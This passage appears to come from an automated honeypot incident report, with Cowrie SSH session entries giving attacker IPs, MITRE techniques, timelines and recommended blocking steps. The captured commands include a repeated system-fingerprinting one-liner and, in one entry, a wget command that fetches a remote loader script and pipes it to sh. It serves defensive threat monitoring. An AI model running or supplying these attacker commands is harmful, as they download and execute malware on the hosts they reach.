| `2026-07-24 19:33:12` | `cowrie.session.connect` |
| `2026-07-24 19:33:13` | `cowrie.client.version` |
| `2026-07-24 19:33:13` | `cowrie.client.kex` |
| `2026-07-24 19:33:17` | `cowrie.login.success` |
| `2026-07-24 19:33:19` | `cowrie.session.params` |
| `2026-07-24 19:33:19` | `cowrie.command.input` |
| `2026-07-24 19:33:19` | `cowrie.command.input` |
| `2026-07-24 19:33:19` | `cowrie.command.input` |
| `2026-07-24 19:33:19` | `cowrie.command.input` |
| `2026-07-24 19:33:19` | `cowrie.command.input` |
| `2026-07-24 19:33:19` | `cowrie.command.success` |
| `2026-07-24 19:33:19` | `cowrie.command.input` |
| `2026-07-24 19:33:19` | `cowrie.command.input` |
| `2026-07-24 19:33:19` | `cowrie.command.input` |
| `2026-07-24 19:33:19` | `cowrie.command.input` |
| `2026-07-24 19:33:20` | `cowrie.log.closed` |
| `2026-07-24 19:33:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4076d896f0b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:34 |
| **Last Seen** | 2026-07-24 19:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:34:15` | `cowrie.session.connect` |
| `2026-07-24 19:34:15` | `cowrie.client.version` |
| `2026-07-24 19:34:15` | `cowrie.client.kex` |
| `2026-07-24 19:34:16` | `cowrie.login.success` |
| `2026-07-24 19:34:17` | `cowrie.session.params` |
| `2026-07-24 19:34:17` | `cowrie.command.input` |
| `2026-07-24 19:34:17` | `cowrie.command.input` |
| `2026-07-24 19:34:17` | `cowrie.command.input` |
| `2026-07-24 19:34:17` | `cowrie.command.input` |
| `2026-07-24 19:34:17` | `cowrie.command.input` |
| `2026-07-24 19:34:17` | `cowrie.command.success` |
| `2026-07-24 19:34:17` | `cowrie.command.input` |
| `2026-07-24 19:34:17` | `cowrie.command.input` |
| `2026-07-24 19:34:17` | `cowrie.command.input` |
| `2026-07-24 19:34:17` | `cowrie.command.input` |
| `2026-07-24 19:34:17` | `cowrie.log.closed` |
| `2026-07-24 19:34:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95e40a50c742

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:34 |
| **Last Seen** | 2026-07-24 19:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:34:21` | `cowrie.session.connect` |
| `2026-07-24 19:34:21` | `cowrie.client.version` |
| `2026-07-24 19:34:21` | `cowrie.client.kex` |
| `2026-07-24 19:34:25` | `cowrie.login.success` |
| `2026-07-24 19:34:27` | `cowrie.session.params` |
| `2026-07-24 19:34:27` | `cowrie.command.input` |
| `2026-07-24 19:34:27` | `cowrie.command.input` |
| `2026-07-24 19:34:27` | `cowrie.command.input` |
| `2026-07-24 19:34:27` | `cowrie.command.input` |
| `2026-07-24 19:34:27` | `cowrie.command.input` |
| `2026-07-24 19:34:27` | `cowrie.command.success` |
| `2026-07-24 19:34:27` | `cowrie.command.input` |
| `2026-07-24 19:34:27` | `cowrie.command.input` |
| `2026-07-24 19:34:27` | `cowrie.command.input` |
| `2026-07-24 19:34:27` | `cowrie.command.input` |
| `2026-07-24 19:34:28` | `cowrie.log.closed` |
| `2026-07-24 19:34:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b6423f9ce17

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-24 19:34 |
| **Last Seen** | 2026-07-24 19:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:34:33` | `cowrie.session.connect` |
| `2026-07-24 19:34:33` | `cowrie.client.version` |
| `2026-07-24 19:34:33` | `cowrie.client.kex` |
| `2026-07-24 19:34:34` | `cowrie.login.success` |
| `2026-07-24 19:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38fef2bf0411

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-24 19:34 |
| **Last Seen** | 2026-07-24 19:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:34:33` | `cowrie.session.connect` |
| `2026-07-24 19:34:33` | `cowrie.client.version` |
| `2026-07-24 19:34:33` | `cowrie.client.kex` |
| `2026-07-24 19:34:34` | `cowrie.login.success` |
| `2026-07-24 19:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a965673f3f0b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:35 |
| **Last Seen** | 2026-07-24 19:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:35:29` | `cowrie.session.connect` |
| `2026-07-24 19:35:29` | `cowrie.client.version` |
| `2026-07-24 19:35:29` | `cowrie.client.kex` |
| `2026-07-24 19:35:33` | `cowrie.login.success` |
| `2026-07-24 19:35:35` | `cowrie.session.params` |
| `2026-07-24 19:35:35` | `cowrie.command.input` |
| `2026-07-24 19:35:35` | `cowrie.command.input` |
| `2026-07-24 19:35:35` | `cowrie.command.input` |
| `2026-07-24 19:35:35` | `cowrie.command.input` |
| `2026-07-24 19:35:35` | `cowrie.command.input` |
| `2026-07-24 19:35:35` | `cowrie.command.success` |
| `2026-07-24 19:35:35` | `cowrie.command.input` |
| `2026-07-24 19:35:35` | `cowrie.command.input` |
| `2026-07-24 19:35:35` | `cowrie.command.input` |
| `2026-07-24 19:35:35` | `cowrie.command.input` |
| `2026-07-24 19:35:36` | `cowrie.log.closed` |
| `2026-07-24 19:35:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c1ee57cae9a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:36 |
| **Last Seen** | 2026-07-24 19:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:36:01` | `cowrie.session.connect` |
| `2026-07-24 19:36:01` | `cowrie.client.version` |
| `2026-07-24 19:36:01` | `cowrie.client.kex` |
| `2026-07-24 19:36:02` | `cowrie.login.success` |
| `2026-07-24 19:36:03` | `cowrie.session.params` |
| `2026-07-24 19:36:03` | `cowrie.command.input` |
| `2026-07-24 19:36:03` | `cowrie.command.input` |
| `2026-07-24 19:36:03` | `cowrie.command.input` |
| `2026-07-24 19:36:03` | `cowrie.command.input` |
| `2026-07-24 19:36:03` | `cowrie.command.input` |
| `2026-07-24 19:36:03` | `cowrie.command.success` |
| `2026-07-24 19:36:03` | `cowrie.command.input` |
| `2026-07-24 19:36:03` | `cowrie.command.input` |
| `2026-07-24 19:36:03` | `cowrie.command.input` |
| `2026-07-24 19:36:03` | `cowrie.command.input` |
| `2026-07-24 19:36:03` | `cowrie.log.closed` |
| `2026-07-24 19:36:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd5417e92fd6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:36 |
| **Last Seen** | 2026-07-24 19:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:36:37` | `cowrie.session.connect` |
| `2026-07-24 19:36:38` | `cowrie.client.version` |
| `2026-07-24 19:36:38` | `cowrie.client.kex` |
| `2026-07-24 19:36:41` | `cowrie.login.success` |
| `2026-07-24 19:36:44` | `cowrie.session.params` |
| `2026-07-24 19:36:44` | `cowrie.command.input` |
| `2026-07-24 19:36:44` | `cowrie.command.input` |
| `2026-07-24 19:36:44` | `cowrie.command.input` |
| `2026-07-24 19:36:44` | `cowrie.command.input` |
| `2026-07-24 19:36:44` | `cowrie.command.input` |
| `2026-07-24 19:36:44` | `cowrie.command.success` |
| `2026-07-24 19:36:44` | `cowrie.command.input` |
| `2026-07-24 19:36:44` | `cowrie.command.input` |
| `2026-07-24 19:36:44` | `cowrie.command.input` |
| `2026-07-24 19:36:44` | `cowrie.command.input` |
| `2026-07-24 19:36:45` | `cowrie.log.closed` |
| `2026-07-24 19:36:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b44afc5a1b4

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-24 19:37 |
| **Last Seen** | 2026-07-24 19:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:37:37` | `cowrie.session.connect` |
| `2026-07-24 19:37:37` | `cowrie.client.version` |
| `2026-07-24 19:37:37` | `cowrie.client.kex` |
| `2026-07-24 19:37:37` | `cowrie.login.success` |
| `2026-07-24 19:37:38` | `cowrie.direct-tcpip.request` |
| `2026-07-24 19:37:38` | `cowrie.direct-tcpip.data` |
| `2026-07-24 19:37:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d63044b778b0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:37 |
| **Last Seen** | 2026-07-24 19:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:37:44` | `cowrie.session.connect` |
| `2026-07-24 19:37:44` | `cowrie.client.version` |
| `2026-07-24 19:37:44` | `cowrie.client.kex` |
| `2026-07-24 19:37:46` | `cowrie.login.success` |
| `2026-07-24 19:37:47` | `cowrie.session.params` |
| `2026-07-24 19:37:47` | `cowrie.command.input` |
| `2026-07-24 19:37:47` | `cowrie.command.input` |
| `2026-07-24 19:37:47` | `cowrie.command.input` |
| `2026-07-24 19:37:47` | `cowrie.command.input` |
| `2026-07-24 19:37:47` | `cowrie.command.input` |
| `2026-07-24 19:37:47` | `cowrie.command.success` |
| `2026-07-24 19:37:47` | `cowrie.command.input` |
| `2026-07-24 19:37:47` | `cowrie.command.input` |
| `2026-07-24 19:37:47` | `cowrie.command.input` |
| `2026-07-24 19:37:47` | `cowrie.command.input` |
| `2026-07-24 19:37:47` | `cowrie.log.closed` |
| `2026-07-24 19:37:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47cc3443ecc7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:37 |
| **Last Seen** | 2026-07-24 19:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:37:45` | `cowrie.session.connect` |
| `2026-07-24 19:37:45` | `cowrie.client.version` |
| `2026-07-24 19:37:45` | `cowrie.client.kex` |
| `2026-07-24 19:37:50` | `cowrie.login.success` |
| `2026-07-24 19:37:52` | `cowrie.session.params` |
| `2026-07-24 19:37:52` | `cowrie.command.input` |
| `2026-07-24 19:37:52` | `cowrie.command.input` |
| `2026-07-24 19:37:52` | `cowrie.command.input` |
| `2026-07-24 19:37:52` | `cowrie.command.input` |
| `2026-07-24 19:37:52` | `cowrie.command.input` |
| `2026-07-24 19:37:52` | `cowrie.command.success` |
| `2026-07-24 19:37:52` | `cowrie.command.input` |
| `2026-07-24 19:37:52` | `cowrie.command.input` |
| `2026-07-24 19:37:52` | `cowrie.command.input` |
| `2026-07-24 19:37:52` | `cowrie.command.input` |
| `2026-07-24 19:37:53` | `cowrie.log.closed` |
| `2026-07-24 19:37:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76ee5bcf0d45

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]174` |
| **First Seen** | 2026-07-24 19:38 |
| **Last Seen** | 2026-07-24 19:40 |
| **Session Duration** | 105s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `su, shell, uname -a, cd /var/run || cd /mnt || cd /root || cd /; wget -qO- hxxp://164.215.103[.]113:6996/pikujyhtcxz/loader.sh | sh -s 164.215.103[.]113` |
| **Download Attempts** | hxxp://164.215.103[.]113:6996/pikujyhtcxz/loader.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:38:27` | `cowrie.session.connect` |
| `2026-07-24 19:38:28` | `cowrie.login.success` |
| `2026-07-24 19:38:29` | `cowrie.session.params` |
| `2026-07-24 19:38:29` | `cowrie.command.input` |
| `2026-07-24 19:38:30` | `cowrie.command.input` |
| `2026-07-24 19:38:30` | `cowrie.command.failed` |
| `2026-07-24 19:38:31` | `cowrie.command.input` |
| `2026-07-24 19:38:33` | `cowrie.command.input` |
| `2026-07-24 19:38:33` | `cowrie.session.file_download` |
| `2026-07-24 19:40:13` | `cowrie.log.closed` |
| `2026-07-24 19:40:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]174` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6456f3ee63f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:38 |
| **Last Seen** | 2026-07-24 19:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:38:53` | `cowrie.session.connect` |
| `2026-07-24 19:38:54` | `cowrie.client.version` |
| `2026-07-24 19:38:54` | `cowrie.client.kex` |
| `2026-07-24 19:38:57` | `cowrie.login.success` |
| `2026-07-24 19:39:00` | `cowrie.session.params` |
| `2026-07-24 19:39:00` | `cowrie.command.input` |
| `2026-07-24 19:39:00` | `cowrie.command.input` |
| `2026-07-24 19:39:00` | `cowrie.command.input` |
| `2026-07-24 19:39:00` | `cowrie.command.input` |
| `2026-07-24 19:39:00` | `cowrie.command.input` |
| `2026-07-24 19:39:00` | `cowrie.command.success` |
| `2026-07-24 19:39:00` | `cowrie.command.input` |
| `2026-07-24 19:39:00` | `cowrie.command.input` |
| `2026-07-24 19:39:00` | `cowrie.command.input` |
| `2026-07-24 19:39:00` | `cowrie.command.input` |
| `2026-07-24 19:39:00` | `cowrie.log.closed` |
| `2026-07-24 19:39:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a8270621da0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:39 |
| **Last Seen** | 2026-07-24 19:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:39:23` | `cowrie.session.connect` |
| `2026-07-24 19:39:23` | `cowrie.client.version` |
| `2026-07-24 19:39:23` | `cowrie.client.kex` |
| `2026-07-24 19:39:25` | `cowrie.login.success` |
| `2026-07-24 19:39:26` | `cowrie.session.params` |
| `2026-07-24 19:39:26` | `cowrie.command.input` |
| `2026-07-24 19:39:26` | `cowrie.command.input` |
| `2026-07-24 19:39:26` | `cowrie.command.input` |
| `2026-07-24 19:39:26` | `cowrie.command.input` |
| `2026-07-24 19:39:26` | `cowrie.command.input` |
| `2026-07-24 19:39:26` | `cowrie.command.success` |
| `2026-07-24 19:39:26` | `cowrie.command.input` |
| `2026-07-24 19:39:26` | `cowrie.command.input` |
| `2026-07-24 19:39:26` | `cowrie.command.input` |
| `2026-07-24 19:39:26` | `cowrie.command.input` |
| `2026-07-24 19:39:26` | `cowrie.log.closed` |
| `2026-07-24 19:39:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ce5300bb1e4

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:40 |
| **Last Seen** | 2026-07-24 19:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:40:02` | `cowrie.session.connect` |
| `2026-07-24 19:40:03` | `cowrie.client.version` |
| `2026-07-24 19:40:03` | `cowrie.client.kex` |
| `2026-07-24 19:40:06` | `cowrie.login.success` |
| `2026-07-24 19:40:08` | `cowrie.session.params` |
| `2026-07-24 19:40:08` | `cowrie.command.input` |
| `2026-07-24 19:40:08` | `cowrie.command.input` |
